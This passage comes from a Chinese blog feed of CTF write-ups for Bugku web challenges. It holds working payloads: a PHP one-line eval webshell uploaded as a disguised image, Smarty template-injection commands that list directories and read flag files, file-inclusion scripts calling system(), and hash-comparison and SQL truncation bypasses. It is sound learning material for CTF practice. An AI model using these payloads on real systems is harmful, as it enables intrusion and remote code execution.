class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://localhost:63342/</span></span><br><span class="line"><span class="comment">Cookie: BUGKU=s:13:&quot;ctf.bugku.com&quot;;</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br></pre></td></tr></table></figure><p>得到flag数据包</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">21</span> Apr <span class="number">2023</span> <span class="number">09</span>:<span class="number">21</span>:<span class="number">28</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span>.<span class="number">7</span> (Ubuntu)</span><br><span class="line">X-Powered-By: PHP/<span class="number">5.5</span>.<span class="number">9</span>-<span class="number">1</span>ubuntu4.<span class="number">6</span></span><br><span class="line">Content-Length: <span class="number">38</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">flag&#123;<span class="number">5</span>dbc2bf735b5715dfdae97b6e7b85478&#125;</span><br></pre></td></tr></table></figure><p><img src="c4.png" alt="flag"></p><h2 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h2><blockquote><p>在做测试时，网站的src资源要尽可能的利用起来，每一个src资源说不定都是突破口。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-012</title>
      <link href="/2023/04/20/CTF-web-012/"/>
      <url>/2023/04/20/CTF-web-012/</url>
      
        <content type="html"><![CDATA[<p>题目源于bugku web</p><span id="more"></span><h1 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="a1.png" alt="head"><br>网址返回的内容如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 将get参数获得的变量和值组成的数组 转换为php程序的变量和值</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查变量是否存在</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$ac</span>))&#123;</span><br><span class="line">    <span class="comment">// file_get_contents() 函数把整个文件读入一个字符串中。</span></span><br><span class="line">    <span class="comment">// trim去除两端空格和特殊字符       </span></span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fn</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$ac</span> === <span class="variable">$f</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;This is flag:&quot;</span> .<span class="string">&quot; <span class="subst">$flag</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 总结起来，就是：</span></span><br><span class="line"><span class="comment">// 1.读取文件内容为字符串，并且去除文件内容左右两边的空格</span></span><br><span class="line"><span class="comment">// 2.本题需要传入$ac和$fn两个变量</span></span><br><span class="line"><span class="comment">// 3.判断上传的字符串和本地文件的字符串是否对等</span></span><br></pre></td></tr></table></figure><p>尝试构造url就变成了</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.67.175.224:14174/?fn=flag.txt&amp;ac=bugku</span></span><br><span class="line"></span><br><span class="line">如果可以使用伪协议的话，可以尝试构造为：</span><br><span class="line">http:<span class="comment">//114.67.175.224:14174/?ac=1&amp;fn=php://input</span></span><br><span class="line">并且抓个包，在头部末空一行再输入<span class="number">1</span>，放行数据包。</span><br><span class="line"></span><br><span class="line">不过构造的伪协议不知道为什么没成功过……</span><br><span class="line"></span><br><span class="line">最终得到的flag是这个</span><br><span class="line">This is flag: flag&#123;<span class="number">1</span>c88af690ab416b04390b6c44cb96c3a&#125;</span><br></pre></td></tr></table></figure><p><img src="a5.png" alt="flag"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>PHP伪协议<br>PHP利用本地文件投机取巧</p></blockquote><h1 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p><img src="b1.png" alt="题目"><br><img src="b2.png" alt="题目"><br><img src="b3.png" alt="题目"></p><p>这道题的坑点在于我没有第一时间意识到文件包含要使用指定方式而不是直接访问地址。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件名为：word.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可执行脚本</span></span><br><span class="line">&lt;script language=php&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)&lt;/script&gt;</span><br><span class="line"><span class="comment">// 返回了当前目录</span></span><br><span class="line">about hello.php index.php upload upload.php</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可执行脚本</span></span><br><span class="line">&lt;script language=php&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>)&lt;/script&gt;</span><br><span class="line"><span class="comment">// 返回根目录，发现flag</span></span><br><span class="line">bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr <span class="keyword">var</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可执行脚本</span></span><br><span class="line">&lt;script language=php&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>)&lt;/script&gt;</span><br><span class="line"><span class="comment">// 返回文件内容，得到flag</span></span><br><span class="line">flag&#123;<span class="number">67</span>fc9d73eaa7f66ba90109ff41e45bc6&#125;</span><br></pre></td></tr></table></figure><p><img src="b5.png" alt="flag"></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>文件包含–利用后缀绕过，并且使用代码进行查询<br>这道题的漏洞在于：上传文件后，利用文件的可执行漏洞，调用本地的文件系统命令去查询对应的文件和目录，造成了文件目录遍历的漏洞。</p><p>解题思路：</p><blockquote><p>遇到文件上传时，可以考虑这样子解决<br>1.伪协议，例如php伪协议<br>2.后门文件上传，传入自己写好的后门后再尝试进行链接</p><blockquote><p>有直接访问图像或者文件所在地址的连接<br>有查看可执行文件白名单后，上传可执行文件后访问根目录下文件的连接<br>3.文件包含解决：传入的变量是一个可执行文件</p></blockquote></blockquote><h1 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h1><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>打开题目后大致获得下面的代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// 屏蔽所有的报错信息</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 获取变量值</span></span><br><span class="line"><span class="variable">$zero</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="variable">$first</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;first&#x27;</span>];</span><br><span class="line"><span class="comment">// 拼接</span></span><br><span class="line"><span class="variable">$second</span>=<span class="variable">$zero</span>.<span class="variable">$first</span>;</span><br><span class="line"><span class="comment">// 正则表达式筛选拼接字符串是否包含关键字</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class="variable">$second</span>))&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$second</span>;</span><br><span class="line">    <span class="comment">// 带着..或者flag关键字就排除</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.\.|flag/&quot;</span>,<span class="variable">$key</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$third</span>=<span class="variable">$first</span>;</span><br><span class="line">        <span class="comment">// \056\160\150--&gt;每个字符不大于8，判断为8进制</span></span><br><span class="line">        <span class="comment">// \x70 --&gt; 判断为十六进制编码</span></span><br><span class="line">        <span class="comment">// 将八进制和十六进制转换为十进制，再将十进制换算为ASCII码，得到的完整正则表达式如下</span></span><br><span class="line">        <span class="comment">// \|.php,且忽略大小写</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>))&#123;</span><br><span class="line">            <span class="comment">// 从字符串第六个的位置开始截取，并且存储为后缀</span></span><br><span class="line">            <span class="variable">$end</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$third</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="comment">// 高亮        base64解码zero，并且与后缀相互连接</span></span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$zero</span>).<span class="variable">$end</span>);<span class="comment">//maybe flag in flag.php</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 总结下来，就是：?zero=ZmxhZw==&amp;first=aaaa|.php</span></span><br><span class="line"><span class="comment">// 得到flag</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;flag&#123;0d53cb7ca00760f270c12514f9920d62&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><blockquote><p>PHP正则表达式当中表达式的识别<br>base64绕过正则表达式<br>八进制解码</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-011</title>
      <link href="/2023/04/19/CTF-web-011/"/>
      <url>/2023/04/19/CTF-web-011/</url>
      
        <content type="html"><![CDATA[<p>题目源：bugku web</p><span id="more"></span><h1 id="聪明的PHP"><a href="#聪明的PHP" class="headerlink" title="聪明的PHP"></a>聪明的PHP</h1><h2 id="得题"><a href="#得题" class="headerlink" title="得题"></a>得题</h2><p><img src="a1.png" alt="head"><br><img src="a2.png" alt="head"><br>检测是不是模板漏洞<br><img src="a3.png" alt="检测"><br>从执行情况可以看出是模板漏洞。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">常用payload</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat ../../../flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br><span class="line">smarty中的&#123;<span class="keyword">if</span>&#125;标签中可以执行php语句</span><br></pre></td></tr></table></figure><p>引入上面的知识，构造本题的Payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">passthru — 执行外部程序并且显示原始输出</span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): ?<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">command</span><br><span class="line">    要执行的命令。</span><br><span class="line">result_code</span><br><span class="line">    如果提供 result_code 参数， Unix 命令的返回状态会被记录到此参数。</span><br><span class="line"></span><br><span class="line">实践：</span><br><span class="line">http:<span class="comment">//114.67.175.224:15841/?a=&#123;if%20passthru(%22ls -al%22)&#125;&#123;/if&#125;</span></span><br><span class="line"></span><br><span class="line">total <span class="number">8</span></span><br><span class="line">drwxrwxrwx <span class="number">1</span> root root <span class="number">120</span> Mar  <span class="number">2</span>  <span class="number">2021</span> .</span><br><span class="line">drwxr-xr-x <span class="number">1</span> root root  <span class="number">18</span> Oct  <span class="number">8</span>  <span class="number">2019</span> ..</span><br><span class="line">drwxrwxrwx <span class="number">1</span> root root   <span class="number">6</span> Mar  <span class="number">2</span>  <span class="number">2021</span> cache</span><br><span class="line">drwxrwxrwx <span class="number">1</span> root root   <span class="number">6</span> Mar  <span class="number">2</span>  <span class="number">2021</span> configs</span><br><span class="line">-rwxrwxrwx <span class="number">1</span> root root <span class="number">629</span> Mar  <span class="number">2</span>  <span class="number">2021</span> index.php</span><br><span class="line">drwxrwxrwx <span class="number">1</span> root root <span class="number">128</span> Mar  <span class="number">2</span>  <span class="number">2021</span> libs</span><br><span class="line">-rwxrwxrwx <span class="number">1</span> root root  <span class="number">22</span> Mar  <span class="number">2</span>  <span class="number">2021</span> template.html</span><br><span class="line">drwxrwxrwx <span class="number">1</span> root root  <span class="number">23</span> Mar  <span class="number">2</span>  <span class="number">2021</span> templates</span><br><span class="line">drwxrwxrwx <span class="number">1</span> root root   <span class="number">6</span> Mar  <span class="number">2</span>  <span class="number">2021</span> templates_c</span><br><span class="line">---------------------------</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//114.67.175.224:15841/?a=&#123;if%20passthru(%22ls /%22)&#125;&#123;/if&#125;</span></span><br><span class="line"></span><br><span class="line">_15775 bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr <span class="keyword">var</span> php </span><br><span class="line"></span><br><span class="line">-------------------------------</span><br><span class="line">找到_15775，查看下文件内容</span><br><span class="line">http:<span class="comment">//114.67.175.224:15841/?a=&#123;if%20passthru(%22tac /_15775%22)&#125;&#123;/if&#125;</span></span><br><span class="line"></span><br><span class="line">flag&#123;<span class="number">3</span>c6611714341762ef90c8b99323d4786&#125;</span><br></pre></td></tr></table></figure><p><img src="a4.png" alt="flag"></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>PHP的smarty模板漏洞<br><a href="https://blog.csdn.net/m_de_g/article/details/120380488">引用</a></p><h1 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>题目提供了PHP代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;2.php&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$IM</span>= <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// 大致意思就是提交字符串，必须符合前面的正则表达式规则。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 核心就一句正则</span></span><br><span class="line">key.*key.&#123;<span class="number">4</span>,<span class="number">7</span>&#125;key:\/.\/(.*key)[a-z][[:punct:]],</span><br><span class="line">写一个与之匹配的正则表达式</span><br><span class="line">keykeyeeeekey:/a/akeya_</span><br><span class="line"></span><br><span class="line">提交上去</span><br><span class="line">http:<span class="comment">//114.67.175.224:11701/index.php?id=keykeyeeeekey:/a/akeya_</span></span><br><span class="line">得到flag</span><br><span class="line">key is: flag&#123;fdadd36b1a5b5c952a63c8ffa2c3acaa&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基础正则表达式</p><h1 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h1><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p><img src="c.png" alt="head"><br><img src="c1.png" alt="head"><br><img src="c2.png" alt="head"></p><p>得到PHP代码，其他文字信息省略了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$v1</span> != <span class="variable">$v2</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$v3</span>, <span class="variable">$flag</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">?v1=s878926199a&amp;v2=s155964671a&amp;v3[]=<span class="number">1</span></span><br><span class="line">得到flag</span><br><span class="line"></span><br><span class="line">flag&#123;a26aaff94aa33cfc4b5473ba2345b18b&#125;</span><br></pre></td></tr></table></figure><p><img src="c3.png" alt="flag"><br><img src="c4.png" alt="flag"></p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><blockquote><p>md5的0e开头的md5值默认哈希值为0，两md5值相等<br>strcmp数组绕过</p></blockquote><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><p><img src="d1.png" alt="head"><br><img src="d2.png" alt="head"></p><p>得到题目的思考方向是文件上传木马，菜刀一线连。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">使用一句话木马，放在一个名为x.jpg的文件当中。</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="d5.png" alt="body"><br>这两处修改是关键，有两个途径可以得出来：<br>1.文件后台的源代码<br>2.一点点的在抓包区域尝试</p><blockquote><p>不过尝试的结果是：文件上传的地址是没有任意文件解析的，比如上传个后缀是jpg的后门，实际上仅仅作为jpg文件展示，不会解析其中包含的后门程序。<br>必然的结果就是必须改为php4，而且那处Content-Type也必须修改<br><img src="d6.png" alt="body"><br><img src="d7.png" alt="body"><br>打开文件后得到flag</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">958</span>a6689c83c55f910022bdc8cc2e49c&#125;</span><br></pre></td></tr></table></figure><p><img src="d8.png" alt="flag"></p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>后门文件上传，文件上传绕过。</p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-010</title>
      <link href="/2023/04/18/CTF-web-010/"/>
      <url>/2023/04/18/CTF-web-010/</url>
      
        <content type="html"><![CDATA[<h1 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="a1.png" alt="head"><br><img src="a2.png" alt="head"></p><p>题目提示：SQL约束攻击<br>网上查查资料不难发现，它的原理大概是这样子的：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SQL数据库在建造数据库之初，会限制数据的存储位数，例如用户名限制为<span class="number">10</span>位</span><br><span class="line">而且，存储在数据库当中的数据，会自动将表数据后面的空格省略，自然就只剩下了前面的数据。</span><br><span class="line">这种情况有一种前提情况，就是提供服务的网站提供注册时，用户名有没有唯一性，有没有限制为用户名的数据量大小</span><br><span class="line"></span><br><span class="line">这种情况下的解题思路：</span><br><span class="line"><span class="number">1</span>.注册用户名时，使用admin                                       <span class="number">1</span>进行注册，密码自定义为admin1A</span><br><span class="line"><span class="number">2</span>.使用admin+admin1A进行登录，得到信息或者flag</span><br></pre></td></tr></table></figure><p><img src="a3.png" alt="flag"><br><img src="a4.png" alt="flag"></p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>SQL约束攻击</p><blockquote><p>指限制SQL数据表的初始限制条件<br>指借着限制条件注册为超级用户</p></blockquote><h1 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h1><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p><img src="b1.png" alt="head"><br><img src="b2.png" alt="head"><br>题目没提示多少信息，源码也只有简单的一句话。<br>尝试使用Python抓包，并且抓上头部信息<br>题目提示的“快”字的含义是：数据包是临时的，需要会话维持，即session。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">url</span>):</span><br><span class="line">    nux = requests.session()</span><br><span class="line">    text1=nux.get(url)</span><br><span class="line">    <span class="built_in">print</span>(text1.text)</span><br><span class="line">    <span class="built_in">print</span>(text1.headers)</span><br><span class="line">    text2=nux.post(url)</span><br><span class="line">    <span class="built_in">print</span>(text2.text)</span><br><span class="line">    <span class="built_in">print</span>(text2.headers)</span><br><span class="line"></span><br><span class="line">func(<span class="string">&#x27;http://114.67.175.224:15467/&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="b3.png" alt="body"><br>得出flag的base64后，尝试解码<br><img src="b4.png" alt="body"><br><img src="b5.png" alt="body"><br>发现了这个有两层base64的大坑，根据观察，还发现了一点东西：它给出的base64的flag在实时刷新</p><blockquote><p>也就是说，只要离开了session，flag就得重新生成。<br>那么不能将答案贴出来查base64的二次编码解码，只能在代码当中实现base64的两次解码</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 改进Python函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">url</span>):</span><br><span class="line">    index = requests.session()</span><br><span class="line">    x = base64.b64decode(index.get(url=url).headers[<span class="string">&#x27;flag&#x27;</span>]).decode()</span><br><span class="line">    z = base64.b64decode(x.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">    data = &#123;<span class="string">&#x27;margin&#x27;</span>: z&#125;</span><br><span class="line">    y = index.post(url=url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(y.text)</span><br><span class="line"></span><br><span class="line">func(<span class="string">&#x27;http://114.67.175.224:15467/&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="b6.png" alt="flag"><br>得到最终flag<br><img src="b7.png" alt="flag"></p><h2 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h2><blockquote><p>Python request抓包<br>Python 抓包的时候需要抓取各个方面的详细信息。<br>Python base64解码</p></blockquote><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p><a href="https://md5.cn/">MD5加解密网站</a><br><img src="c1.png" alt="head"><br>打开页面后，除了一句话，其他什么都没有</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">please input a</span><br></pre></td></tr></table></figure><p>分析提示信息，应该是传入md5值到变量a。这里调用之前使用过的弱类型md5进行尝试。<br>直接爆出flag？？？<br><img src="c2.png" alt="flag"><br><img src="c3.png" alt="flag"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>md5碰撞，并且是哈希值为0的碰撞。</p>]]></content>
      
      
      <categories>
          
          <category> CTF赛题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-web-009</title>
      <link href="/2023/04/17/CTF-web-009/"/>
      <url>/2023/04/17/CTF-web-009/</url>
      
        <content type="html"><![CDATA[<h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h1><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p><img src="a1.png" alt="word"><br><img src="a2.png" alt="word"><br>得到的信息有最重要的</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;a#s#s#e#r#t&quot;</span>; </span><br><span class="line"><span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>); </span><br><span class="line"><span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>]; </span><br><span class="line"><span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])</span><br><span class="line"></span><br><span class="line">简单分析：</span><br><span class="line"><span class="number">1</span>.将传入的字符串按“<span class="comment">#” 进行拆分</span></span><br><span class="line"><span class="number">2</span>.将每个拆分出来的字母单独取出来</span><br><span class="line"><span class="number">3</span>.get传参</span><br><span class="line"></span><br><span class="line">解题方向：</span><br><span class="line">使用url传入变量s的值，尝试是不是有代码执行漏洞</span><br></pre></td></tr></table></figure><p>简单鉴定下，如下：<br><img src="a3.png" alt="end"><br>既然存在这种漏洞，那接下来就简单多了。这里分享两种办法：</p><h3 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">连接的语句如下，使用菜刀连接的过程就不赘述了</span><br><span class="line">http:<span class="comment">//114.67.175.224:15800/?s=@eval($_POST[%27caidao%27])</span></span><br></pre></td></tr></table></figure><p><img src="a4.png" alt="flag"></p><h3 id="使用url进行payload"><a href="#使用url进行payload" class="headerlink" title="使用url进行payload"></a>使用url进行payload</h3><p>访问目录信息</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//114.67.175.224:15800/?s=print_r(scandir(%27./%27))</span></span><br><span class="line">返回信息</span><br><span class="line"><span class="title function_ invoke__">Array</span> ( [<span class="number">0</span>] =&gt; . [<span class="number">1</span>] =&gt; .. [<span class="number">2</span>] =&gt; flaga15808abee46a1d5.txt [<span class="number">3</span>] =&gt; index.php )</span><br><span class="line">证明当前目录下有flag文件</span><br><span class="line">尝试打开文件得到flag</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//114.67.175.224:15800/flaga15808abee46a1d5.txt</span></span><br><span class="line">返回flag</span><br><span class="line">flag&#123;fae9ddc2a5afda6fe332b4b32fb8053a&#125;</span><br></pre></td></tr></table></figure><p><img src="a5.png" alt="flag"></p><h2 